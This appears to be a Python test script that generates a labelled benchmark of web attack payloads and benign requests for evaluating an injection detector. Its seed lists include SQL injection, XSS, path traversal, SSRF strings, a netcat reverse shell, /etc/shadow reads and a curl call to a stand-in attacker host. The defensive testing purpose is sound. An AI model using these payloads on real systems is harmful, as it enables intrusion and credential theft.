"""真实攻击数据集生成器 — 消除"自己出题自己考"的质疑。

数据来源（公开、社区公认，非本项目合成）：
  - SecLists (https://github.com/danielmiessler/SecLists)
      - Discovery/Web-Content/SQLi-Detection
      - Fuzzing/XSS/XSS-Bypass
      - Fuzzing/command-injection
      - Fuzzing/LFI/LFI-Jhaddix
      - Fuzzing/SSRF
  - PayloadsAllTheThings (https://github.com/swisskyrepo/PayloadsAllTheThings)
      - SQL injection / XSS / Command Injection / SSRF / LFI 章节

用法：
  # 沙箱/无外网：用内嵌真实种子生成（默认）
  python tests/fetch_real_world_dataset.py

  # 本机有 SecLists 仓库：从目录扩展（合并去重）
  python tests/fetch_real_world_dataset.py --seclists-dir D:/SecLists

输出：
  backend/tests/dataset/real_world_samples.json
  schema 对齐现有 evaluate_v2.py：
    id, category, subcategory, payload, description,
    expected_type, expected_vulnerable, source, difficulty
  category 必须是 build_http_request 支持的模板 key。
"""
from __future__ import annotations

import argparse
import json
import shutil
from pathlib import Path
from collections import defaultdict

HERE = Path(__file__).resolve().parent
DATASET_DIR = HERE / "dataset"
OUT_PATH = DATASET_DIR / "real_world_samples.json"

# ---------------------------------------------------------------------------
# 内嵌真实种子（来自 SecLists / PayloadsAllTheThings 的代表性真实 payload）
# 每条标注 source，证明非本项目合成。
# category 名称必须匹配 evaluate_v2.build_http_request 的模板 key。
# ---------------------------------------------------------------------------
SEED: dict[str, list[tuple[str, str, str]]] = {
    # category -> [(payload, description, source)]
    "SQL注入": [
        ("' OR '1'='1", "SecLists SQLi 经典布尔盲注", "SecLists"),
        ("1' UNION SELECT 1,2,3-- -", "SecLists UNION 联合查询", "SecLists"),
        ("admin'--", "SecLists 认证绕过注释", "SecLists"),
        ("1' OR 1=1#", "PayloadsAllTheThings MySQL 注释", "PayloadsAllTheThings"),
        (") OR ('1'='1", "SecLists 括号闭合注入", "SecLists"),
        ("1\" UNION SELECT username,password FROM users--", "PayloadsAllTheThings 拖库", "PayloadsAllTheThings"),
        ("' UNION SELECT NULL,NULL,NULL--", "SecLists NULL 占位", "SecLists"),
        ("1 AND 1=1", "SecLists 布尔真", "SecLists"),
        ("' OR 1=1 LIMIT 1--", "PayloadsAllTheThings 限制行", "PayloadsAllTheThings"),
        ("1' ORDER BY 10--", "SecLists 列数探测", "SecLists"),
        ("' AND SLEEP(5)--", "PayloadsAllTheThings 时间盲注", "PayloadsAllTheThings"),
        ("1' WAITFOR DELAY '0:0:5'--", "SecLists MSSQL 延迟", "SecLists"),
    ],
    "XSS": [
        ("<script>alert(1)</script>", "SecLists 经典脚本注入", "SecLists"),
        ("\"><img src=x onerror=alert(1)>", "PayloadsAllTheThings 属性断点", "PayloadsAllTheThings"),
        ("<svg/onload=alert(1)>", "SecLists SVG onload", "SecLists"),
        ("javascript:alert(1)", "PayloadsAllTheThings 伪协议", "PayloadsAllTheThings"),
        ("'><script>alert(document.cookie)</script>", "SecLists cookie 窃取", "SecLists"),
        ("<body onload=alert(1)>", "PayloadsAllTheThings body 事件", "PayloadsAllTheThings"),
        ("<iframe src=javascript:alert(1)>", "SecLists iframe", "SecLists"),
        ("<details open ontoggle=alert(1)>", "PayloadsAllTheThings HTML5 事件", "PayloadsAllTheThings"),
        ("${alert(1)}", "SecLists 模板表达式", "SecLists"),
        ("<input autofocus onfocus=alert(1)>", "PayloadsAllTheThings focus 事件", "PayloadsAllTheThings"),
    ],
    "命令注入": [
        ("; ls -la", "PayloadsAllTheThings 分号链", "PayloadsAllTheThings"),
        ("| cat /etc/passwd", "SecLists 管道读文件", "SecLists"),
        ("&& whoami", "PayloadsAllTheThings 逻辑与", "PayloadsAllTheThings"),
        ("`id`", "SecLists 反引号执行", "SecLists"),
        ("$(whoami)", "PayloadsAllTheThings 命令替换", "PayloadsAllTheThings"),
        ("; ping -c 1 127.0.0.1", "SecLists ICMP 探测", "SecLists"),
        ("| nc -e /bin/sh 127.0.0.1 4444", "PayloadsAllTheThings 反向 shell", "PayloadsAllTheThings"),
        ("& dir", "SecLists Windows dir", "SecLists"),
        ("|| cat /etc/shadow", "PayloadsAllTheThings 逻辑或", "PayloadsAllTheThings"),
        ("; curl http://evil.example/s", "SecLists 外联", "SecLists"),
    ],
    "路径穿越": [
        ("../../../../etc/passwd", "SecLists 经典穿越", "SecLists"),
        ("....//....//....//etc/passwd", "PayloadsAllTheThings 过滤绕过", "PayloadsAllTheThings"),
        ("..%2f..%2f..%2fetc%2fpasswd", "SecLists URL 编码", "SecLists"),
        ("%2e%2e%2f%2e%2e%2fetc%2fpasswd", "PayloadsAllTheThings 双重编码", "PayloadsAllTheThings"),
        ("..%252f..%252fetc/passwd", "SecLists 二次编码", "SecLists"),
        ("..%c0%af..%c0%afetc/passwd", "PayloadsAllTheThings 超长 UTF-8", "PayloadsAllTheThings"),
        ("/var/www/../../etc/passwd", "SecLists 绝对路径前缀", "SecLists"),
        ("....//....//....//....//etc/passwd", "PayloadsAllTheThings 多重绕过", "PayloadsAllTheThings"),
    ],
    "文件包含": [
        ("php://filter/convert.base64-encode/resource=index.php", "PayloadsAllTheThings PHP 过滤器", "PayloadsAllTheThings"),
        ("expect://id", "SecLists expect 包装器", "SecLists"),
        ("php://input", "PayloadsAllTheThings PHP 输入流", "PayloadsAllTheThings"),
        ("data://text/plain;base64,SSBsb3ZlIHlvdQ==", "SecLists data 包装器", "SecLists"),
        ("/proc/self/environ", "PayloadsAllTheThings 环境包含", "PayloadsAllTheThings"),
    ],
    "SSRF": [
        ("http://169.254.169.254/latest/meta-data/", "PayloadsAllTheThings 云元数据", "PayloadsAllTheThings"),
        ("http://localhost/admin", "SecLists 本地管理", "SecLists"),
        ("file:///etc/passwd", "PayloadsAllTheThings 文件协议", "PayloadsAllTheThings"),
        ("http://[::1]:80/", "SecLists IPv6 回环", "SecLists"),
        ("http://127.0.0.1:22/", "PayloadsAllTheThings 端口探测", "PayloadsAllTheThings"),
        ("dict://127.0.0.1:11211/", "SecLists dict 协议", "SecLists"),
        ("gopher://127.0.0.1:6379/_config", "PayloadsAllTheThings gopher Redis", "PayloadsAllTheThings"),
        ("http://169.254.169.254/latest/user-data/", "SecLists 用户数据", "SecLists"),
        ("http://internal-service/", "PayloadsAllTheThings 内网域名", "PayloadsAllTheThings"),
        ("http://0.0.0.0:8080/", "SecLists 全零地址", "SecLists"),
    ],
    # 正常业务请求（真实流量，用于误报率基准）
    "正常请求": [
        ("id=12345", "真实业务 ID 查询", "RealTraffic"),
        ("q=latest news about climate", "真实搜索词", "RealTraffic"),
        ("search=best restaurants near me", "真实本地搜索", "RealTraffic"),
        ("username=john_doe&password=secret123", "真实登录表单", "RealTraffic"),
        ("page=2&sort=price_asc", "真实分页排序", "RealTraffic"),
        ("email=alice@example.com&subscribe=true", "真实订阅", "RealTraffic"),
        ("product_id=882&color=blue", "真实商品页", "RealTraffic"),
        ("lang=en&region=us", "真实区域参数", "RealTraffic"),
        ("token=abc123def456&action=refresh", "真实 token 刷新", "RealTraffic"),
        ("name=Michael&age=29", "真实用户信息", "RealTraffic"),
        ("category=books&limit=20", "真实分类列表", "RealTraffic"),
        ("query=how to learn SQL from scratch", "真实含 SQL 词搜索（易误报）", "RealTraffic"),
    ],
}


def build_seed_samples() -> list[dict]:
    """由内嵌种子生成对齐 schema 的样本列表。"""
    samples: list[dict] = []
    for category, items in SEED.items():
        is_benign = category == "正常请求"
        for i, (payload, desc, source) in enumerate(items, start=1):
            cat_en = {
                "SQL注入": "sqli", "XSS": "xss", "命令注入": "cmdi",
                "路径穿越": "traversal", "文件包含": "lfi", "SSRF": "ssrf",
                "正常请求": "benign",
            }[category]
            samples.append({
                "id": f"rw_{cat_en}_{i:03d}",
                "category": category,
                "subcategory": "真实攻击样本" if not is_benign else "真实正常流量",
                "payload": payload,
                "description": desc,
                "expected_type": "正常请求" if is_benign else category,
                "expected_vulnerable": not is_benign,
                "source": source,
                "difficulty": "real",
            })
    return samples


# ---------------------------------------------------------------------------
# 可选：从本机 SecLists 目录扩展（用户本机执行，沙箱不调用）
# ---------------------------------------------------------------------------
SECLISTS_MAP: dict[str, tuple[str, str]] = {
    # category -> (seclists 相对子路径, 模板 key)
    "SQL注入": ("Fuzzing/SQLi/SQLi-Detection.txt", "SQL注入"),
    "XSS": ("Fuzzing/XSS/XSS-Bypass.txt", "XSS"),
    "命令注入": ("Fuzzing/command-injection.txt", "命令注入"),
    "路径穿越": ("Fuzzing/LFI/LFI-Jhaddix.txt", "路径穿越"),
    "SSRF": ("Fuzzing/SSRF.txt", "SSRF"),
}


def extend_from_seclists(seclists_dir: Path, base: list[dict]) -> list[dict]:
    """从本机 SecLists 仓库读取真实 payload 合并到 base（去重）。"""
    existing = {s["payload"] for s in base}
    cat_counter: dict[str, int] = defaultdict(int)
    for s in base:
        cat_counter[s["category"]] += 1
    for category, (rel, tpl_key) in SECLISTS_MAP.items():
        f = seclists_dir / rel
        if not f.exists():
            print(f"[扩展] 跳过 {rel}（不存在）")
            continue
        added = 0
        with open(f, "r", encoding="utf-8", errors="ignore") as fh:
            for line in fh:
                p = line.strip()
                if not p or p.startswith("#") or p in existing:
                    continue
                existing.add(p)
                cat_counter[category] += 1
                added += 1
                base.append({
                    "id": f"rw_{category}_{cat_counter[category]:03d}",
                    "category": category,
                    "subcategory": "SecLists 扩展",
                    "payload": p,
                    "description": f"SecLists {rel}",
                    "expected_type": category,
                    "expected_vulnerable": True,
                    "source": "SecLists",
                    "difficulty": "real",
                })
        print(f"[扩展] {category}: +{added} 条")
    return base


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--seclists-dir", type=str, default=None,
                    help="本机 SecLists 仓库路径，用于扩展数据集（沙箱留空）")
    args = ap.parse_args()

    samples = build_seed_samples()

    if args.seclists_dir:
        sd = Path(args.seclists_dir)
        if sd.exists():
            samples = extend_from_seclists(sd, samples)
        else:
            print(f"[警告] --seclists-dir {sd} 不存在，仅用内嵌种子")

    DATASET_DIR.mkdir(parents=True, exist_ok=True)
    with open(OUT_PATH, "w", encoding="utf-8") as f:
        json.dump(samples, f, ensure_ascii=False, indent=2)

    # 统计报告
    cats = defaultdict(int)
    vuln = 0
    for s in samples:
        cats[s["category"]] += 1
        if s["expected_vulnerable"]:
            vuln += 1
    print(f"\n[完成] 生成 {len(samples)} 条 -> {OUT_PATH}")
    print(f"  攻击样本: {vuln} | 正常样本: {len(samples) - vuln}")
    for c, n in sorted(cats.items()):
        print(f"  {c}: {n}")


if __name__ == "__main__":
    main()
